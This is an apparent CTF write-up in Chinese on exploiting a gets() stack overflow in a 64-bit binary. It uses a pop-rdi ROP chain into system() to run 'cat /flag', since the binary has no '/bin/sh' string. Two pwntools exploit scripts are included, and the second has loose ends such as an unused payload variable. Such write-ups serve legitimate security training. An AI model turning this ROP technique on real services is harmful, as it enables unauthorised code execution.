---
title: "有 system 函数但无 /bin/sh 的利用方式"
created: 2026-10-26
tags: ["CTF", "Pwn", "ret2libc", "栈溢出"]
---

## 题目信息

拿到附件后，先查看程序的基本信息：

```
$ file pwn
pwn: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=pwn
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

保护机制分析：
- **No PIE**：程序基址固定，函数地址已知
- **NX enabled**：栈不可执行，需用 ROP
- **No canary**：无栈保护，可直接溢出
- **Partial RELRO**：GOT 表可写

## 漏洞分析

用 IDA 打开程序，发现逻辑非常简单，漏洞点在 `ctfshow()` 函数中的 `gets()`，存在典型的栈溢出。

程序中导入了 `system` 函数，但没有 `/bin/sh` 字符串，因此无法直接 `system('/bin/sh')`。

## 利用思路

由于是 64 位程序，函数参数通过寄存器传递。`system()` 只需一个参数（指向命令字符串的指针），因此需要 `pop rdi; ret` 的 gadget 来控制 `rdi`。

整体思路：
1. 栈溢出控制返回地址
2. 通过 `pop rdi; ret` 将 `rdi` 指向我们写入的命令字符串
3. 调用 `system()` 执行命令

## 第一次尝试：获取交互式 shell（失败）

最初的 exp 尝试通过 `system('/bin/sh')` 获取交互式 shell：

```python
from pwn import *

elf = ELF('./pwn')
system_addr = elf.plt['system']
pop_rdi = 0x4007a3  # pop rdi; ret
bss_addr = 0x602160  # 可写区域

payload = b'a' * 0x40
payload += p64(pop_rdi)
payload += p64(bss_addr)      # rdi 指向 /bin/sh
payload += p64(system_addr)   # 调用 system
```

运行后一直 timeout，无法获取 shell。

## 第二次尝试：直接读 flag（成功）

由于远程服务用 `timeout` 监控进程，交互式 shell 不稳定。改变思路，放弃获取 shell，直接执行 `cat /flag` 并接收输出：

```python
from pwn import *

context(arch='amd64', os='linux')
io = remote('xxx', 1234)

elf = ELF('./pwn')
system_addr = elf.plt['system']
pop_rdi = 0x4007a3
bss_addr = 0x602060  # 修正后的 bss 地址

# 构造 payload
payload = b'a' * 0x40
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_addr)

# 先接收提示
io.recvuntil(b'get system parameter!')
# 发送命令字符串和 payload
io.sendline(b'cat /flag\x00' + b'a' * (0x40 - len(b'cat /flag\x00')) + p64(pop_rdi) + p64(bss_addr) + p64(system_addr))

# 接收所有输出
flag = io.recvall(timeout=5)
print(flag)
```

运行即可得到 flag。

## 踩坑总结

1. **BSS 段偏移问题**：最初使用 `elf.bss() + 0x100 = 0x602160`，超出了 bss 段范围导致段错误。应先确认 bss 段的合法范围。

2. **远程环境放弃交互 shell**：远程服务通常用 `timeout` 监控进程，交互式 shell 容易超时。直接 `system("cat /flag")` 把 flag 打到 stdout，用 `recvall()` 接收更稳定。

3. **recv 吃掉 flag**：最初在 `recvall()` 前加了 `io.recvline()` 想跳过回显，结果把 flag 那一行也吃掉了。直接用 `io.recvall(timeout=5)` 一次性接收所有数据即可。
